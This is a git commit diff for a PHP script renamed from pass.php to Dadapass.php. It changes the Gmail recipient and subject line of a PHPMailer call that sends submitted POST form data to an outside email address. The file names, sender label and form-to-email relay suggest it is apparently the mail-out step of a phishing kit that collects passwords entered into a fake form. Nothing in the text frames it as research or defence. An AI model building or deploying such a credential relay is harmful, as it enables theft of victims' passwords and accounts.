5f43ac92289b43e22b7c7b2395a582f837001b76
Ontres44322 <onlinemeta858@gmail.com>
2025-07-09 23:13:02 +0500

    Update and rename pass.php to Dadapass.php

--- Dadapass.php
+++ Dadapass.php
@@ -35,14 +35,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('patjckbang@gmail.com', 'passss');
-        $mail->addAddress('uffemail215@gmail.com');
+        $mail->addAddress('officialw224@gmail.com');
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'PA';
+        $mail->Subject = 'dada';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
